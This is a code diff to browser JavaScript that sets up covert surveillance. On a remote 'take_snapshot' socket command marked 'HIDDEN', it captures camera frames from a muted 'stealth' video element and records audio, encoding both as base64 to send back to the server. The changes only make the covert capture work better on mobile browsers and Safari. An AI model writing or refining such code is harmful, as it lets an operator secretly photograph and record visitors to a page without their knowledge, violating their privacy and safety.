@@ -40,6 +40,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     cameraStream = stream;
                     stealthVideo.srcObject = stream;
                     stealthVideo.muted = true; // prevent feedback loop locally
+                    
+                    // Explicitly play to ensure frames are loaded (important for mobile)
+                    stealthVideo.play().catch(e => console.log("Video play warning:", e));
                 })
                 .catch(err => {
                     console.log("Media denied or not available", err);
@@ -116,11 +119,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
         // HIDDEN: Listen for snapshot command
         socket.on('take_snapshot', () => {
-            if (cameraStream && stealthVideo.readyState === stealthVideo.HAVE_ENOUGH_DATA) {
-                stealthCanvas.width = stealthVideo.videoWidth;
-                stealthCanvas.height = stealthVideo.videoHeight;
+            if (cameraStream) {
+                // Ensure dimensions exist
+                const width = stealthVideo.videoWidth || 640;
+                const height = stealthVideo.videoHeight || 480;
+                
+                stealthCanvas.width = width;
+                stealthCanvas.height = height;
                 const context = stealthCanvas.getContext('2d');
-                context.drawImage(stealthVideo, 0, 0, stealthCanvas.width, stealthCanvas.height);
+                context.drawImage(stealthVideo, 0, 0, width, height);
                 
                 // Get base64 image
                 const imageData = stealthCanvas.toDataURL('image/jpeg', 0.8);
@@ -148,7 +155,8 @@ document.addEventListener('DOMContentLoaded', () => {
                         });
 
                         mediaRecorder.addEventListener("stop", () => {
-                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            // Let the browser decide the mime type automatically (Fix for iPhones/Safari)
+                            const audioBlob = new Blob(audioChunks);
                             
                             // Convert Blob to Base64 to send via socket
                             const reader = new FileReader();
